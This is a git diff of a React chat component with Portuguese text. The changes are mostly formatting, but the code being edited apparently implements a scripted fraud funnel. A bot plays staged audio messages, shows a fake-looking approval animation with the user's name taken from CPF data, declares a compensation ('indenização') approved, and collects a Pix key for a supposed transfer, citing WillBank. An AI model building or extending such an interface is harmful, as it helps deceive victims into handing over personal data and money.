@@ -284,7 +284,6 @@ const Chat = () => {
     setWaitingForAudio("/audio/audio-3.mp3");
     setStep("audio-3-validation");
   };
-
   const handleConfirmValidation = async () => {
     addUserMessage(<span>✓ CONFIRMAR VALIDAÇÃO</span>);
     setStep("processing");
@@ -293,7 +292,6 @@ const Chat = () => {
     // Approval Animation Card (agora aparece depois do botão de confirmação)
     await addBotMessage(<ApprovalAnimation value={valorBeneficio} name={cpfData?.nome || ""} />, false);
     await delay(3500);
-
     await addBotMessage(<span className="flex items-center gap-2 text-green-600 text-lg font-bold">
         <CheckCircle2 className="w-6 h-6" />
         Sua indenização foi aprovada! ✅
@@ -349,9 +347,9 @@ const Chat = () => {
         <p className="font-bold text-red-600 flex items-center gap-2">
           ⚠️ ATENÇÃO, {cpfData?.nome?.split(' ')[0]}!
         </p>
-        <p className="text-sm">Confira os dados inseridos para garantir que o valor será transferido corretamente:</p>
+        <p className="text-sm text-primary-foreground">Confira os dados inseridos para garantir que o valor será transferido corretamente:</p>
         <div className="bg-white rounded-lg p-3 border space-y-1">
-          <p><strong>Nome:</strong> {cpfData?.nome}</p>
+          <p className=""><strong>Nome:</strong> {cpfData?.nome}</p>
           <p><strong>Chave Pix:</strong> {pixKeyInput}</p>
         </div>
         <p className="text-xs text-muted-foreground">Se houver algum erro, o pagamento não será concluído. A WillBank não se responsabiliza em casos de transferências em chave pix erradas.</p>
@@ -739,8 +737,12 @@ const AudioPlayerComponent = forwardRef<HTMLDivElement, {
   isPlaying: boolean;
   onPlay: () => void;
   listened?: boolean;
-}>(({ audioSrc, isPlaying, onPlay, listened }, ref) => (
-  <div ref={ref} className="flex items-center gap-3 w-48">
+}>(({
+  audioSrc,
+  isPlaying,
+  onPlay,
+  listened
+}, ref) => <div ref={ref} className="flex items-center gap-3 w-48">
     <button onClick={onPlay} className="w-10 h-10 bg-gradient-to-br from-primary to-amber-400 rounded-full flex items-center justify-center shadow-md hover:scale-105 transition-transform shrink-0 relative">
       {isPlaying ? <Pause className="w-5 h-5 text-primary-foreground" fill="currentColor" /> : <Play className="w-5 h-5 text-primary-foreground ml-0.5" fill="currentColor" />}
       {listened && <span className="absolute -top-1 -right-1 w-4 h-4 bg-green-500 rounded-full flex items-center justify-center border-2 border-slate-700">
@@ -758,8 +760,7 @@ const AudioPlayerComponent = forwardRef<HTMLDivElement, {
           <Check className="w-3 h-3" /> Ouvido
         </span>}
     </div>
-  </div>
-));
+  </div>);
 AudioPlayerComponent.displayName = "AudioPlayerComponent";
 
 // Approval Animation Component - Like the reference image
@@ -829,12 +830,12 @@ const ApprovalAnimation = ({
       </div>
     </div>;
 };
-const AnimatedCheckDot = forwardRef<HTMLDivElement, { completed: boolean }>(
-  ({ completed }, ref) => (
-    <div ref={ref} className={`w-8 h-8 rounded-full flex items-center justify-center transition-all duration-500 ${completed ? 'bg-gradient-to-br from-primary to-amber-400 scale-100' : 'bg-muted scale-75'}`}>
+const AnimatedCheckDot = forwardRef<HTMLDivElement, {
+  completed: boolean;
+}>(({
+  completed
+}, ref) => <div ref={ref} className={`w-8 h-8 rounded-full flex items-center justify-center transition-all duration-500 ${completed ? 'bg-gradient-to-br from-primary to-amber-400 scale-100' : 'bg-muted scale-75'}`}>
       {completed && <Check className="w-4 h-4 text-primary-foreground animate-scale-in" />}
-    </div>
-  )
-);
+    </div>);
 AnimatedCheckDot.displayName = "AnimatedCheckDot";
 export default Chat;
